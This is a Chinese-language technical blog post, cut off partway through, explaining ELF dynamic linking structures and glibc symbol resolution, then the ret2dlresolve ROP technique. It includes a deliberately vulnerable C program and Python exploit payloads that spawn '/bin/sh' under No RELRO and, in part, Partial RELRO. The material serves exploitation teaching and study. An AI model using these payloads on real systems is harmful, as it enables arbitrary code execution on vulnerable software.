/* Program header table file offset */  Elf32_Off        e_shoff;                /* Section header table file offset */  Elf32_Word        e_flags;                /* Processor-specific flags */  Elf32_Half        e_ehsize;                /* ELF header size in bytes */  Elf32_Half        e_phentsize;                /* Program header table entry size */  Elf32_Half        e_phnum;                /* Program header table entry count */  Elf32_Half        e_shentsize;                /* Section header table entry size */  Elf32_Half        e_shnum;                /* Section header table entry count */  Elf32_Half        e_shstrndx;                /* Section header string table index */} Elf32_Ehdr;typedef struct{  unsigned char        e_ident[EI_NIDENT];        /* Magic number and other info */  Elf64_Half        e_type;                        /* Object file type */  Elf64_Half        e_machine;                /* Architecture */  Elf64_Word        e_version;                /* Object file version */  Elf64_Addr        e_entry;                /* Entry point virtual address */  Elf64_Off        e_phoff;                /* Program header table file offset */  Elf64_Off        e_shoff;                /* Section header table file offset */  Elf64_Word        e_flags;                /* Processor-specific flags */  Elf64_Half        e_ehsize;                /* ELF header size in bytes */  Elf64_Half        e_phentsize;                /* Program header table entry size */  Elf64_Half        e_phnum;                /* Program header table entry count */  Elf64_Half        e_shentsize;                /* Section header table entry size */  Elf64_Half        e_shnum;                /* Section header table entry count */  Elf64_Half        e_shstrndx;                /* Section header string table index */} Elf64_Ehdr;</code></pre><p>Section Header Table 是一个 <code>Elf64_Shdr</code>（<code>Elf32_Shdr</code>）的数组（程序执行时一般没有 Section Header Table），指出每个 Section 的地址：</p><pre><code class="cpp">/* Section header.  */typedef struct{  Elf32_Word        sh_name;                /* Section name (string tbl index) */  Elf32_Word        sh_type;                /* Section type */  Elf32_Word        sh_flags;                /* Section flags */  Elf32_Addr        sh_addr;                /* Section virtual addr at execution */  Elf32_Off        sh_offset;                /* Section file offset */  Elf32_Word        sh_size;                /* Section size in bytes */  Elf32_Word        sh_link;                /* Link to another section */  Elf32_Word        sh_info;                /* Additional section information */  Elf32_Word        sh_addralign;                /* Section alignment */  Elf32_Word        sh_entsize;                /* Entry size if section holds table */} Elf32_Shdr;typedef struct{  Elf64_Word        sh_name;                /* Section name (string tbl index) */  Elf64_Word        sh_type;                /* Section type */  Elf64_Xword        sh_flags;                /* Section flags */  Elf64_Addr        sh_addr;                /* Section virtual addr at execution */  Elf64_Off        sh_offset;                /* Section file offset */  Elf64_Xword        sh_size;                /* Section size in bytes */  Elf64_Word        sh_link;                /* Link to another section */  Elf64_Word        sh_info;                /* Additional section information */  Elf64_Xword        sh_addralign;                /* Section alignment */  Elf64_Xword        sh_entsize;                /* Entry size if section holds table */} Elf64_Shdr;</code></pre><p>Program Header Table 是一个 <code>Elf64_Phdr</code>（<code>Elf32_Phdr</code>）的数组，指定数据以及其在内存中的位置，即某个范围会被加载到哪个地址（Segment 包含多个 Section）：</p><pre><code class="cpp">/* Program segment header.  */typedef struct{  Elf32_Word        p_type;                        /* Segment type */  Elf32_Off        p_offset;                /* Segment file offset */  Elf32_Addr        p_vaddr;                /* Segment virtual address */  Elf32_Addr        p_paddr;                /* Segment physical address */  Elf32_Word        p_filesz;                /* Segment size in file */  Elf32_Word        p_memsz;                /* Segment size in memory */  Elf32_Word        p_flags;                /* Segment flags */  Elf32_Word        p_align;                /* Segment alignment */} Elf32_Phdr;typedef struct{  Elf64_Word        p_type;                        /* Segment type */  Elf64_Word        p_flags;                /* Segment flags */  Elf64_Off        p_offset;                /* Segment file offset */  Elf64_Addr        p_vaddr;                /* Segment virtual address */  Elf64_Addr        p_paddr;                /* Segment physical address */  Elf64_Xword        p_filesz;                /* Segment size in file */  Elf64_Xword        p_memsz;                /* Segment size in memory */  Elf64_Xword        p_align;                /* Segment alignment */} Elf64_Phdr;</code></pre><h3 id="Dynamic-Section"><a href="#Dynamic-Section" class="headerlink" title="Dynamic Section"></a>Dynamic Section</h3><p><code>.dynamic</code> 是一个 <code>Elf64_Dyn</code>（<code>Elf32_Dyn</code>）数组，是解析 Symbol 时最重要的一个 Section。执行时可以根据 Program Header Table，找出 <code>p_type</code> 值为 <code>PT_DYNAMIC</code> 的 Program Header。Program Header Table 的基址加上 <code>p_offset</code> 的结果就是 <code>.dynamic</code> 的地址。其中的 <code>union</code> 里用 <code>d_val</code> 还是 <code>d_ptr</code> 取决于 <code>d_tag</code>（<code>DT_xxx</code>）：</p><pre><code class="cpp">/* Dynamic section entry.  */typedef struct{  Elf32_Sword        d_tag;                        /* Dynamic entry type */  union    {      Elf32_Word d_val;                        /* Integer value */      Elf32_Addr d_ptr;                        /* Address value */    } d_un;} Elf32_Dyn;typedef struct{  Elf64_Sxword        d_tag;                        /* Dynamic entry type */  union    {      Elf64_Xword d_val;                /* Integer value */      Elf64_Addr d_ptr;                        /* Address value */    } d_un;} Elf64_Dyn;</code></pre><h4 id="dynsym"><a href="#dynsym" class="headerlink" title=".dynsym"></a><code>.dynsym</code></h4><p><code>.dynsym</code> 是 <code>.dynamic</code> 中 <code>d_tag</code> 为 <code>DT_SYMTAB</code> 的 entry，<code>d_ptr</code> 指向 <code>.dynsym</code> Section（<code>Elf64_Sym</code> 或 <code>Elf32_Sym</code> 数组）。其中 <code>st_name</code> 指向 Symbol Name：</p><pre><code class="cpp">/* Symbol table entry.  */typedef struct{  Elf32_Word        st_name;                /* Symbol name (string tbl index) */  Elf32_Addr        st_value;                /* Symbol value */  Elf32_Word        st_size;                /* Symbol size */  unsigned char        st_info;                /* Symbol type and binding */  unsigned char        st_other;                /* Symbol visibility */  Elf32_Section        st_shndx;                /* Section index */} Elf32_Sym;typedef struct{  Elf64_Word        st_name;                /* Symbol name (string tbl index) */  unsigned char        st_info;                /* Symbol type and binding */  unsigned char st_other;                /* Symbol visibility */  Elf64_Section        st_shndx;                /* Section index */  Elf64_Addr        st_value;                /* Symbol value */  Elf64_Xword        st_size;                /* Symbol size */} Elf64_Sym;</code></pre><h4 id="dynstr"><a href="#dynstr" class="headerlink" title=".dynstr"></a><code>.dynstr</code></h4><p><code>.dynstr</code> 是 <code>.dynamic</code> 中 <code>d_tag</code> 为 <code>DT_STRTAB</code> 的 entry，是 <code>.dynsym</code> 中 <code>st_name</code> 对应的字符串表（<code>name = (char *)(.dynstr+.dynsym[xx]-&gt;st_name)</code>）。</p><h4 id="rel-plt（-rela-plt）"><a href="#rel-plt（-rela-plt）" class="headerlink" title=".rel.plt（.rela.plt）"></a><code>.rel.plt</code>（<code>.rela.plt</code>）</h4><p><code>.rel.plt</code>（<code>.rela.plt</code>）是 <code>.dynamic</code> 中 <code>d_tag</code> 为 <code>DT_JMPREL</code> 的 entry，对应的结构体是 <code>Elf64_Rela</code>（<code>Elf32_Rel</code>）。<code>XX_Rela</code> 相比 <code>XX_Rel</code> 多了一个没什么用处的 <code>r_addend</code>，测试的时候发现 32 位程序用的是 <code>Elf32_Rel</code>，而 64 位程序用的是 <code>Elf64_Rela</code>。<code>r_offset</code> 为需要重定位的地址的偏移，即 <code>.got.plt</code>（GOT）；<code>r_info</code> 中包含 Symbol Index（Symbol Index 即为 <code>.dynsym</code> 中的 Section Index）。<code>ELF64_R_SYM</code>（<code>#define ELF64_R_SYM(i) ((i) &gt;&gt; 32)</code>）用来取高 32bit；<code>ELF32_R_SYM</code>（<code>#define ELF32_R_SYM(val) ((val) &gt;&gt; 8)</code>）用来取高 24bit：</p><pre><code class="cpp">/* Relocation table entry without addend (in section of type SHT_REL).  */typedef struct{  Elf32_Addr        r_offset;                /* Address */  Elf32_Word        r_info;                        /* Relocation type and symbol index */} Elf32_Rel;/* I have seen two different definitions of the Elf64_Rel and   Elf64_Rela structures, so we&#39;ll leave them out until Novell (or   whoever) gets their act together.  *//* The following, at least, is used on Sparc v9, MIPS, and Alpha.  */typedef struct{  Elf64_Addr        r_offset;                /* Address */  Elf64_Xword        r_info;                        /* Relocation type and symbol index */} Elf64_Rel;/* Relocation table entry with addend (in section of type SHT_RELA).  */typedef struct{  Elf32_Addr        r_offset;                /* Address */  Elf32_Word        r_info;                        /* Relocation type and symbol index */  Elf32_Sword        r_addend;                /* Addend */} Elf32_Rela;typedef struct{  Elf64_Addr        r_offset;                /* Address */  Elf64_Xword        r_info;                        /* Relocation type and symbol index */  Elf64_Sxword        r_addend;                /* Addend */} Elf64_Rela;</code></pre><h2 id="Symbol-Resolve"><a href="#Symbol-Resolve" class="headerlink" title="Symbol Resolve"></a>Symbol Resolve</h2><p>接下来看程序是怎么解 Symbol 的。在 Symbol 还没有没解析好的时候，PLT 中的第一条指令会 JMP 到 GOT，而 GOT 原本的值是 PLT 中的第二条指令（<code>XX@plt+6</code>）；第二条指令 <code>PUSH reloc_arg</code>（如果用 <code>.rel.plt</code> 则 <code>reloc_arg</code> 是 <code>offset</code>；如果是 <code>rela.plt.</code> 则是 <code>index</code>）；第三条指令 JMP 至 PLT 中的第一行（<code>PLT0</code>）。</p><p>接下来在 <code>PLT0</code> 中，第一条指令 <code>PUSH GOT1</code> 把 <code>link_map</code> 结构体入栈（64 位在调用 <code>_dl_fixup()</code> 之前会把栈上的 <code>link_map</code> 和 <code>reloc_arg</code> 分别复制给 rdi 和 rsi）；第二条指令 <code>JMP GOT2</code> 来跳转到 Dynamic Resolver 来寻找 Symbol（即跳转到 <code>_dl_runtime_resolve()</code>）</p><h3 id="dl-runtime-resolve"><a href="#dl-runtime-resolve" class="headerlink" title="_dl_runtime_resolve()"></a><code>_dl_runtime_resolve()</code></h3><p><code>_dl_runtime_resolve()</code> 函数是 Symbol 的解析器，它将 <code>link_map</code> 和 <code>reloc_arg</code> 作为参数传入 <code>_dl_fixup()</code>，并在 <code>_dl_fixup()</code> 中获取 Symbol Name，在 Library 中找到对应的地址并填入 GOT。解析成功后，程序会直接跳转到解出的函数地址。</p><p>Resolver 先根据 reloc_arg 定位到 <code>.rel.plt</code>（<code>.rela.plt</code>），然后根据 <code>r_info</code> 找到对应的 Symbol Name，并获取在 Library 中的地址，然后根据 <code>r_offset</code> 找到 GOT，并将获得的地址填入 GOT。查找函数的过程如下：</p><pre><code>_dl_runtime_resolve(link_map, reloc_arg)            __________            |           |Elf64_Rela| &lt;---------+           |----------|      +--- | r_offset |         ___________      |    |  r_info  | -----&gt; | Elf64_Sym |          ____________      |    |__________|        |-----------|         |            |      |                        |  st_name  | ------&gt; | printf\x00 |      |      .rel.plt          |___________|         |____________|      v  __________                     .dynsym                .dynstr |          | | &lt;printf&gt; | |__________|   .got.plt</code></pre><p>其中 <code>link_map</code> 中包括了所有已加载的 ELF 信息。</p><h4 id="link-map"><a href="#link-map" class="headerlink" title="link_map"></a><code>link_map</code></h4><p><code>link_map</code> 结构体在 <a href="https://code.woboq.org/userspace/glibc/include/link.h.html" target="_blank" rel="noopener"><code>glibc/include/link.h</code></a> 中实现。其中，<code>l_next</code> 作为指针连接所有载入的 Library；<code>l_name</code> 存储了 Library 的名字；<code>l_addr</code> 中存储了该 Library 的基址；<code>l_info[x]</code> 则指向 <code>.dynamic</code> 中的数据，<code>x</code> 即为 <code>d_tag</code>，可以用来获取 Library 中的指定 Section：</p><pre><code class="cpp">/* Structure describing a loaded shared object.  The `l_next&#39; and `l_prev&#39;   members form a chain of all the shared objects loaded at startup.   These data structures exist in space used by the run-time dynamic linker;   modifying them may have disastrous results.   This data structure might change in future, if necessary.  User-level   programs must avoid defining objects of this type.  */struct link_map  {    /* These first few members are part of the protocol with the debugger.       This is the same format used in SVR4.  */    ElfW(Addr) l_addr;                /* Difference between the address in the ELF                                   file and the addresses in memory.  */    char *l_name;                /* Absolute file name object was found in.  */    ElfW(Dyn) *l_ld;                /* Dynamic section of the shared object.  */    struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */    /* All following members are internal to the dynamic linker.       They may change without notice.  */    /* This is an element which is only ever different from a pointer to       the very same copy of this type for ld.so when it is used in more       than one namespace.  */    struct link_map *l_real;    /* Number of the namespace this link map belongs to.  */    Lmid_t l_ns;    struct libname_list *l_libname;    /* Indexed pointers to dynamic section.       [0,DT_NUM) are indexed by the processor-independent tags.       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are       indexed by DT_VERSIONTAGIDX(tagvalue).       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by       DT_EXTRATAGIDX(tagvalue).       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are       indexed by DT_VALTAGIDX(tagvalue) and       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)       are indexed by DT_ADDRTAGIDX(tagvalue), see &lt;elf.h&gt;.  */    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM                      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];    const ElfW(Phdr) *l_phdr;        /* Pointer to program header table in core.  */    ElfW(Addr) l_entry;                /* Entry point location.  */    ElfW(Half) l_phnum;                /* Number of program header entries.  */    ElfW(Half) l_ldnum;                /* Number of dynamic segment entries.  */    ...    /* Pointer to the version information if available.  */    ElfW(Versym) *l_versyms;    ...  };</code></pre><h4 id="dl-fixup"><a href="#dl-fixup" class="headerlink" title="_dl_fixup()"></a><code>_dl_fixup()</code></h4><p><code>_dl_fixup()</code> 在 <a href="https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html" target="_blank" rel="noopener">dl-runtime.c</a> 中实现。通过 <code>reloc_arg</code> 在 <code>link_map</code> 中获取相应的 <code>symtab</code>（<code>.dynsym</code> 数组）、<code>strtab</code>（<code>.dynstr</code>）、<code>reloc</code>（<code>.rel.plt</code> 或 <code>.rela.plt</code>）、<code>sym</code>（根据 <code>reloc</code> 中的 <code>r_info</code> 得到对应的 <code>.dynsym</code> 元素）。然后会有一系列的检查，通过检查后根据 <code>strtab + sym-&gt;st_name</code> 的 Symbol Name 查找到对应的地址，最后填入 GOT：</p><pre><code class="cpp">/* This function is called through a special trampoline from the PLT the   first time each PLT entry is called.  We must perform the relocation   specified in the PLT of the given shared object, and return the resolved   function address to the trampoline, which will restart the original call   to that address.  Future calls will bounce directly from the PLT to the   function.  */DL_FIXUP_VALUE_TYPE__attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE_dl_fixup (# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS       ELF_MACHINE_RUNTIME_FIXUP_ARGS,# endif       struct link_map *l, ElfW(Word) reloc_arg){  const ElfW(Sym) *const symtab    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);  // 通过reloc_arg计算重定位入口，JMPREL即.rel.plt，reloc_offset在32位下为reloc_arg（64位下为reloc_arg * sizeof (PLTREL)）  const PLTREL *const reloc    = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);  // 通过reloc-&gt;r_info找到.dynsym中对应的部分  const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];  void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset);  lookup_t result;  DL_FIXUP_VALUE_TYPE value;  // 检查reloc-&gt;r_info的最低位是不是ELF_MACHINE_JMP_SLOT（7，表示这是一个PLT）  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);  // 检查version  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)    {      const struct r_found_version *version = NULL;      if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)    {      const ElfW(Half) *vernum =        (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);      ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;      version = &amp;l-&gt;l_versions[ndx];      if (version-&gt;hash == 0)        version = NULL;    }      /* We need to keep the scope around so do some locking.  This is     not necessary for objects which cannot be unloaded or when     we are not using any threads (yet).  */      int flags = DL_LOOKUP_ADD_DEPENDENCY;      if (!RTLD_SINGLE_THREAD_P)    {      THREAD_GSCOPE_SET_FLAG ();      flags |= DL_LOOKUP_GSCOPE_LOCK;    }#ifdef RTLD_ENABLE_FOREIGN_CALL      RTLD_ENABLE_FOREIGN_CALL;#endif      // 通过strtab + sym-&gt;st_name找到符号表字符串，result为libc基地址      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,                    version, ELF_RTYPE_CLASS_PLT, flags, NULL);      /* We are done with the global scope.  */      if (!RTLD_SINGLE_THREAD_P)    THREAD_GSCOPE_RESET_FLAG ();#ifdef RTLD_FINALIZE_FOREIGN_CALL      RTLD_FINALIZE_FOREIGN_CALL;#endif      // 找到了对应的.dynsym后，Library基址加上st_value的结果即为函数地址      value = DL_FIXUP_MAKE_VALUE (result,                   sym ? (LOOKUP_VALUE_ADDRESS (result)                      + sym-&gt;st_value) : 0);    }  else    {      // 如果Symbol已经找到了      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);      result = l;    }  // value为libc基址加上要解析函数的偏移地址，即实际地址  value = elf_machine_plt_value (l, reloc, value);  if (sym != NULL      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, 0))    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));  /* Finally, fix up the plt itself.  */  if (__builtin_expect (GLRO(dl_bind_not), 0))    return value;  // 把value写入对应的GOT中  return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);}</code></pre><h5 id="dl-lookup-symbol-x-（-dl-lookup-x-）"><a href="#dl-lookup-symbol-x-（-dl-lookup-x-）" class="headerlink" title="_dl_lookup_symbol_x()（_dl_lookup_x()）"></a><code>_dl_lookup_symbol_x()</code>（<code>_dl_lookup_x()</code>）</h5><p><code>_dl_lookup_symbol_x()</code> 以及 <code>_dl_lookup_x()</code> 在 <a href="https://code.woboq.org/userspace/glibc/elf/dl-lookup.c.html" target="_blank" rel="noopener"><code>glibc/elf/dl-look-up.c</code></a> 中实现。其中根据 <code>strtab + sym-&gt;st_name</code> 来查找符号表。理论上可以通过遍历 <code>.dynsym</code> 中的每个元素的 <code>st_name</code> 来获取 <code>.dynstr</code> 中对应的字符串，并和传入的 Symbol Name 进行比较，但这样的时间复杂度就会很高。<code>_dl_lookup_symbol_x()</code> 中则通过哈希表（GNU Hash）来进行查找：</p><pre><code class="cpp">static uint_fast32_tdl_new_hash (const char *s){  uint_fast32_t h = 5381;  for (unsigned char c = *s; c != &#39;\0&#39;; c = *++s)    h = h * 33 + c;  return h &amp; 0xffffffff;}</code></pre><p>可以用 Python 实现这个函数：</p><pre><code class="python">In [1]: def dl_new_hash(s):   ...:   h = 5381   ...:   for c in s:   ...:     h = 33 * h + ord(c)   ...:   return h &amp; 0xffffffff   ...:In [2]: hex(dl_new_hash(&#39;__isoc99_scanf&#39;))Out[2]: &#39;0xeafe348dL&#39;</code></pre><p><code>_dl_lookup_symbol_x()</code> 中，先会调用 <code>dl_new_hash()</code> 来计算 Symbol Name 的哈希值，然后调用 <code>do_lookup_x()</code> 来查找对应的 Symbol：</p><pre><code class="cpp">/* Search loaded objects&#39; symbol tables for a definition of the symbol   UNDEF_NAME, perhaps with a requested version for the symbol.   We must never have calls to the audit functions inside this function   or in any function which gets called.  If this would happen the audit   code might create a thread which can throw off all the scope locking.  */lookup_tinternal_function_dl_lookup_symbol_x (const char *undef_name, struct link_map *undef_map,             const ElfW(Sym) **ref,             struct r_scope_elem *symbol_scope[],             const struct r_found_version *version,             int type_class, int flags, struct link_map *skip_map){  const uint_fast32_t new_hash = dl_new_hash (undef_name); // 获取Symbol Name的哈希  unsigned long int old_hash = 0xffffffff;  struct sym_val current_value = { NULL, NULL };  struct r_scope_elem **scope = symbol_scope;  ...  /* Search the relevant loaded objects for a definition.  */  for (size_t start = i; *scope != NULL; start = 0, ++scope)    {      int res = do_lookup_x (undef_name, new_hash, &amp;old_hash, *ref,                 &amp;current_value, *scope, start, version, flags,                 skip_map, type_class, undef_map);      if (res &gt; 0)    break;  ...  *ref = current_value.s;  return LOOKUP_VALUE (current_value.m);}</code></pre><p>在 <code>do_lookup_x()</code> 中有一个大循环，主要是根据 Symbol Name 的哈希值模 <code>l_nbuckets</code> 作为下标，从 <code>l_gnu_buckets</code> 中获取一个 <code>bucket</code>。然后根据 bucket 从 <code>l_gnu_chain_zero</code> 取出一个哈希值来进行比较，如果正确，那么当前的 <code>bucket</code> 的值就是目标 <code>.dynsym</code> 的下标；如果不正确，将 <code>bucket</code> 的值加 1。最后返回 Symbol Name 对应的 <code>.dynsym</code>：</p><pre><code class="cpp">/* Inner part of the lookup functions.  We return a value &gt; 0 if we   found the symbol, the value 0 if nothing is found and &lt; 0 if   something bad happened.  */static int__attribute_noinline__do_lookup_x (const char *undef_name, uint_fast32_t new_hash,         unsigned long int *old_hash, const ElfW(Sym) *ref,         struct sym_val *result, struct r_scope_elem *scope, size_t i,         const struct r_found_version *const version, int flags,         struct link_map *skip, int type_class, struct link_map *undef_map){  size_t n = scope-&gt;r_nlist;  /* Make sure we read the value before proceeding.  Otherwise we     might use r_list pointing to the initial scope and r_nlist being     the value after a resize.  That is the only path in dl-open.c not     protected by GSCOPE.  A read barrier here might be to expensive.  */  __asm volatile (&quot;&quot; : &quot;+r&quot; (n), &quot;+m&quot; (scope-&gt;r_list));  struct link_map **list = scope-&gt;r_list;  do    {  ...      /* The tables for this map.  */      const ElfW(Sym) *symtab = (const void *) D_PTR (map, l_info[DT_SYMTAB]);      const char *strtab = (const void *) D_PTR (map, l_info[DT_STRTAB]);  ...      if (__builtin_expect (bitmask != NULL, 1))    {      ElfW(Addr) bitmask_word        = bitmask[(new_hash / __ELF_NATIVE_CLASS)              &amp; map-&gt;l_gnu_bitmask_idxbits];      unsigned int hashbit1 = new_hash &amp; (__ELF_NATIVE_CLASS - 1);      unsigned int hashbit2 = ((new_hash &gt;&gt; map-&gt;l_gnu_shift)                   &amp; (__ELF_NATIVE_CLASS - 1));      if (__builtin_expect ((bitmask_word &gt;&gt; hashbit1)                &amp; (bitmask_word &gt;&gt; hashbit2) &amp; 1, 0))        {        // 从l_gnu_buckets中获取一个bucket          Elf32_Word bucket = map-&gt;l_gnu_buckets[new_hash                             % map-&gt;l_nbuckets];          if (bucket != 0)        {      // 从l_gnu_chain_zero取出一个哈希值          const Elf32_Word *hasharr = &amp;map-&gt;l_gnu_chain_zero[bucket];          do            if (((*hasharr ^ new_hash) &gt;&gt; 1) == 0) // 比较哈希值              {            symidx = hasharr - map-&gt;l_gnu_chain_zero;            sym = check_match (&amp;symtab[symidx]);            if (sym != NULL)              goto found_it;              }          while ((*hasharr++ &amp; 1u) == 0);        }        }      /* No symbol found.  */      symidx = SHN_UNDEF;    }  ...    }  /* We have not found anything until now.  */  return 0;}</code></pre><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>根据上面的分析，基本上可以得出 Dynamic Resolver 进行解析 Symbol 的过程：</p><ul><li>根据 <code>reloc_arg</code> 加载 Symbol Name</li><li>根据 <code>link_map</code> 中依次在每个 Library 中找 Symbol</li><li>计算 Symbol 的 Hash</li><li>用 Bloom Filter 检查 Symbol 是否存在（不是很重要）</li><li>在 Hash Bucket 和 Chain 中找 Symbol，若 <code>st_name</code> 符合则找到</li><li>检查 <code>version</code> 是否正确（不太重要）</li><li>填写 GOT 并回传 Symbol 的地址</li></ul><p>而 DynELF 的功能其实就是在干 Dynamic Resolver 的工作，它没有采用 GNU Hash 的方法来查找，而是使用了一个一个找 <code>.dynsym</code> 的方式来定位想要的函数。</p><h1 id="Return-to-Dynamic-Resolver"><a href="#Return-to-Dynamic-Resolver" class="headerlink" title="Return to Dynamic Resolver"></a>Return to Dynamic Resolver</h1><p>一种根据 Dynamic Resolver 的工作原理来实现的 ROP 技术。通过构造传给 <code>_dl_runtime_resolve</code> 的参数，让 <code>_dl_fixup</code> 解析出我们要的 Symbol：</p><ul><li>参数通过栈传递，x86 和 x64 都可以使用</li><li>可以直接 CALL PLT0，这样就只需要传 <code>reloc_arg</code></li><li>需要控制 <code>link_map</code> 的时候可以 JMP PLT0 的第二条指令</li><li>不需要泄漏信息和 libc 版本，百分之百稳定 get shell</li></ul><h2 id="What-is-RELRO"><a href="#What-is-RELRO" class="headerlink" title="What is RELRO"></a>What is RELRO</h2><p>Relocation Read Only（RELRO）保护有不同等级，利用的方法和复杂程度不同：</p><ul><li>No RELRO：所有相关的数据部分都能写</li><li>Partial RELRO（gcc 默认设定的值）：<code>.dynamic</code>、<code>.dynsym</code>、<code>.dynstr</code> 等部分只读</li><li>Full RELRO：所有的 Symbol 在加载时都解析完成，GOT 只读，没有 <code>link_map</code> 和 Dynamic Resolver 的指针可以利用</li></ul><p>下面根据三种情况分析不同的攻击方法。程序源码如下：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;char buf[1000000];int main() {    char local[10];//    write(1, &quot;&gt; &quot;, 2); // 32位下可以在没有泄漏的情况下实现，64位下可能需要泄漏    int len = read(0, buf, sizeof(buf));    memcpy(local, buf, len);    return 0;}</code></pre><h2 id="No-RELRO"><a href="#No-RELRO" class="headerlink" title="No RELRO"></a>No RELRO</h2><p>直接伪造 <code>.dynstr</code>，通过 <code>readelf</code> 找到 <code>.dynamic</code> 中 <code>DT_STRTAB</code> 的位置，把原本的 <code>.dynstr</code> 指向可控制的内存（在上面放 <code>&quot;system\x00&quot;</code>），然后跳到一个还没有解析过的 Symbol 上，如 <code>__gmon_start__</code>。这种方法只能在 No RELRO 的情况下使用。32 位下可以构造如下 payload：</p><pre><code class="python">def memcpy(dst, src, length):    return p32(memcpy_plt) + p32(pop3_ret) + p32(dst) + p32(src) + p32(length)st_name = 0x38payload = (    ((        &#39;A&#39; * 18 + # padding        p32(buf + 1024 + 4) # set esp=buf+1024    ).ljust(1024, &#39;\x00&#39;) + # buf+1024        memcpy(dynstr_addr + 4, buf + 2048, 4) +        p32(gmon_start_plt) +        p32(0xdeadbeef) +        p32(buf + 2048 + 12) # &amp;&quot;/bin/sh\x00&quot;    ).ljust(2048, &#39;\x00&#39;) +  # buf+2048    p32(buf + 2048 + 4 - st_name) + # set strtab=&amp;&quot;system\x00&quot;    &#39;system\x00\x00&#39; +    &#39;/bin/sh\x00&#39;)</code></pre><p>64 位下同理：</p><pre><code class="python">def csu(func, rdi, rsi, rdx):  payload = (        p64(0x40066a) + p64(0) + p64(1) + p64(func) + p64(rdx) + p64(rsi) + p64(rdi) +        p64(0x400650) + 56 * &#39;\x00&#39;  )  return payloaddef memcpy(dst, src, length):    return csu(memcpy_got, dst, src, length)payload = (    ((        &#39;A&#39; * 14 + # padding        p64(buf + 1024 - 8) + # set rbp=buf+1024-8        p64(leave_ret) # stack pivot ; set rsp=buf+1024    ).ljust(1024, &#39;\x00&#39;) + # buf+1024        memcpy(dynstr_addr + 8, buf + 2048, 8) +        p64(pop_rdi_ret) +        p64(buf + 2048 + 16) +        p64(gmon_start_plt)    ).ljust(2048, &#39;\x00&#39;) + # buf+2048    p64(buf + 2048 + 8 - st_name) + # set strtab=&amp;&quot;system\x00&quot;    &#39;system\x00\x00&#39; +    &#39;/bin/sh\x00&#39;)</code></pre><h2 id="Partial-RELRO"><a href="#Partial-RELRO" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h2><p>构造一个假的 <code>Elf32_Rel</code>（<code>Elf64_Rela</code>），使 <code>r_offset</code> 在可写位置，<code>r_info</code> 使 <code>&amp;.dynsym[r_info&gt;&gt;8]</code>（64 位下是 <code>&amp;.dynsym[r_info&gt;&gt;32]</code>）可控。然后传一个特别大的 <code>reloc_arg</code> 进去，使 <code>.rel.plt+reloc_arg</code> 落在假的 <code>Elf32_Rel</code>（<code>Elf64_Rela</code>）上。接着构造一个假的 <code>Elf32_Sym</code>（<code>Elf64_Sym</code>），其中构造 <code>st_name</code> 使 <code>.dynstr+st_name</code> 可控（放上 <code>&quot;system\x00&quot;</code>）</p><p>如果可控的内存地址和 Section 相反或距离太远而无法使用（基本上 64 位会有这个问题），需要让 <code>reloc_arg</code>、<code>r_info</code>、<code>st_name</code> 的参数可以放进这块内存。其中 <code>.gnu.version[r_info&gt;&gt;8]</code> 要为 0，或者把 <code>l_info[VERSYMIDX (DT_VERSYM)]</code> 中的内容清空。由于我们构造的伪 Symbol 中的 <code>r_info</code> 过大，使得 <code>vernum[ELFW(R_SYM) (reloc-&gt;r_info)]</code> 读取出错，如果 <code>l-&gt;l_info[VERSYMIDX (DT_VERSYM)]</code> 的值为 NULL 就不会出错，如下：</p><pre><code class="cpp">      if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)        {          const ElfW(Half) *vernum =            (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);          ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;          version = &amp;l-&gt;l_versions[ndx];          if (version-&gt;hash == 0)            version = NULL;        }</code></pre><p>32 位下可以构造如下 payload：</p><pre><code class="python">payload = (    ((        &#39;A&#39; * 18 + # padding        p32(buf + 1024 + 4) # set esp=buf+1024    ).ljust(1024, &#39;\x00&#39;) + # buf+1024        p32(plt0) +        p32(buf + 2048 - relplt) + # set reloc_arg=buf+2048        p32(0xdeadbeef) +   